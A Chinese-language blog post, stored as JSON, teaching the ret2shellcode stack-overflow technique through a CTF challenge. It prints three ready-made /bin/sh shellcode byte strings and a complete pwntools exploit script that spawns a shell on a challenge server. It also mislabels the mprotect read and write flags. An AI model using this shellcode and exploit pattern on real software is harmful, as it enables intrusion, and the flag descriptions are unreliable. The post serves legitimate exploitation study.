{"title":"ret2shellcode","uid":"f810949b38b4506e3b08df56cbb68d1d","slug":"ret2shellcode","date":"2022-11-03T04:58:03.000Z","updated":"2022-11-03T06:57:41.952Z","comments":true,"path":"api/articles/ret2shellcode.json","keywords":"DevOps, Web, Pwn, Electronics","cover":[],"content":"<h1 id=\"ret2Shellcode\"><a href=\"#ret2Shellcode\" class=\"headerlink\" title=\"ret2Shellcode\"></a>ret2Shellcode</h1><p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by DuskyJuniXor</p>\n<hr>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><ul>\n<li>在栈溢出的攻击技术中通常是要控制函数的返回地址到自己想要的地方执行自己想要执行的代码。ret2shellcode 代表返回到 shellcode 中即控制函数的返回地址到预先设定好的 shellcode 区域中去执行 shellcode 代码，这是非常危险的。</li>\n</ul>\n<h2 id=\"什么是-shellcode？\"><a href=\"#什么是-shellcode？\" class=\"headerlink\" title=\"什么是 shellcode？\"></a>什么是 shellcode？</h2><p>shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，因为经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。 可在暂存器 eip 溢出后，塞入一段可让 CPU 执行的 shellcode 机器码，让电脑可以执行攻击者的任意指令。</p>\n<h2 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2><ul>\n<li><p>ret2shellcode 的关键在于我们找到一个可读可写可执行的缓冲区，接下来把我们的 shellcode 放到这个缓冲区，然后跳转到我们的 shellcode 处执行。</p>\n<img src=\"/post/ret2shellcode/ret2Shellcode1.jpg\" class title=\"ret2Shellcode1\"></li>\n</ul>\n<h2 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h2><ul>\n<li>文件未开启 NX 保护或者有 mprotect() 函数存在修改权限</li>\n</ul>\n<h2 id=\"常用shellcode\"><a href=\"#常用shellcode\" class=\"headerlink\" title=\"常用shellcode\"></a>常用shellcode</h2><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">shellcode &#x3D;\n&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;</code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">shellcode &#x3D; &quot;\\x31\\xc0\\x31\\xdb\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\x51\\x52\\x55\\x89\\xe5\\x0f\\x34\\x31\\xc0\\x31\\xdb\\xfe\\xc0\\x51\\x52\\x55\\x89\\xe5\\x0f\\x34&quot;</code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">shellcode &#x3D; &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;</code></pre>\n\n<h2 id=\"使用-Pwntools-生成-shellcode\"><a href=\"#使用-Pwntools-生成-shellcode\" class=\"headerlink\" title=\"使用 Pwntools 生成 shellcode\"></a>使用 Pwntools 生成 shellcode</h2><p>用pwntool中的shellcraft.sh(),再转汇编字节码asm()</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">asm(shellcraft.sh())</code></pre>\n\n<h2 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h2><p><a href=\"./ret2shellcode/pwn2_2\">pwn2_2</a></p>\n<ul>\n<li><p>checksec 检查保护，CANARY、PIE、RWX 都没有开，开启了 NX 保护</p>\n<img src=\"/post/ret2shellcode/ret2Shellcode2.jpg\" class title=\"ret2Shellcode2\">\n</li>\n<li><p>文件拖入 ida pro 分析</p>\n<img src=\"/post/ret2shellcode/ret2Shellcode3.jpg\" class title=\"ret2Shellcode3\">\n\n<ul>\n<li><p>首先发现 mprotect() 函数，修改了 phone_number 地址权限为7（相当于 rwx）</p>\n<ul>\n<li><p>注：mprotect() 函数原型：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">#include &lt;sys&#x2F;mman.h&gt;\nint mprotect(void *addr, size_t len, int prot);</code></pre>\n\n<p>prot 的取值如下，可以将几个属性结合使用（值相加）：</p>\n<ul>\n<li>PROT_READ：可写，值为 1</li>\n<li>PROT_WRITE：可读， 值为 2</li>\n<li>PROT_EXEC：可执行，值为 4</li>\n<li>PROT_NONE：不允许访问，值为 0</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>没有发现可利用的 backdoor，但发现 main() 中调用了 read() 函数将 STDIN 区的缓存读入 phone_number，再查看 phone_number 的地址在 .bss 段，由上步可知phone_number具有 RWX 权限，同时有容易溢出的栈 buf</p>\n<img src=\"/post/ret2shellcode/ret2Shellcode4.jpg\" class title=\"ret2Shellcode4\">\n</li>\n<li><p>于是思路明确，只要第一次向 phone_number 中写入 shellcode，再溢出 buf 使 rip 指向 phone_number 的地址</p>\n</li>\n<li><p>编写 exp.py</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from pwn import *\ncontext(os &#x3D; &#39;linux&#39;, arch &#x3D; &#39;amd64&#39;, log_level &#x3D; &#39;debug&#39;)\n\nio &#x3D; remote(&quot;gxh191.top&quot;, 25532)\n\nphone_number &#x3D; 0x4040A0\n\npayload1 &#x3D; asm(shellcraft.sh())\nio.sendafter(b&#39;number: &#39;, payload1)\n\npayload2 &#x3D; b&#39;a&#39;*24 + p64(phone_number)\nio.sendafter(b&#39;buf: &#39;, payload2)\n\nio.interactive()</code></pre>\n</li>\n<li><p>成功 getshell！</p>\n<img src=\"/post/ret2shellcode/ret2Shellcode5.jpg\" class title=\"ret2Shellcode5\"></li>\n</ul>\n</li>\n</ul>\n","feature":true,"text":"ret2Shellcode​ ——by DuskyJuniXor 原理 在栈溢出的攻击技术中通常是要控制函数的返回地址到自己想要的地方执行自己想要执行的代码。ret2shellcode 代表返回到 shellcode 中即控制函数的返回地址到预先设定好的 shellcode 区域...","link":"","photos":[],"count_time":{"symbolsCount":"2k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":3,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2Shellcode\"><span class=\"toc-text\">ret2Shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF-shellcode%EF%BC%9F\"><span class=\"toc-text\">什么是 shellcode？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">利用思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8shellcode\"><span class=\"toc-text\">常用shellcode</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-Pwntools-%E7%94%9F%E6%88%90-shellcode\"><span class=\"toc-text\">使用 Pwntools 生成 shellcode</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98\"><span class=\"toc-text\">例题</span></a></li></ol></li></ol>","author":{"name":"DuskyJuniXor","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一边学习一边随手mark的萌新","socials":{"github":"https://github.com/DuskyJuniXor","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://space.bilibili.com/330711030?spm_id_from=333.1007.0.0"}}}},"mapped":true,"prev_post":{"title":"PIE保护机制及常见bypass方法","uid":"377ee1fc1588b431f5397b715f73deb6","slug":"PIE保护机制及常见bypass方法","date":"2022-11-03T07:18:44.000Z","updated":"2022-11-03T11:02:30.810Z","comments":true,"path":"api/articles/PIE保护机制及常见bypass方法.json","keywords":"DevOps, Web, Pwn, Electronics","cover":[],"text":"PIE 保护机制及常见 bypass 方法​ ——by DuskyJuniXor PIE 保护是什么 PIE全称是 position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段 (.text)、数据段 (.data)、未初始...","link":"","photos":[],"count_time":{"symbolsCount":563,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":3,"path":"api/tags/pwn.json"}],"author":{"name":"DuskyJuniXor","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一边学习一边随手mark的萌新","socials":{"github":"https://github.com/DuskyJuniXor","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://space.bilibili.com/330711030?spm_id_from=333.1007.0.0"}}}},"feature":true},"next_post":{}}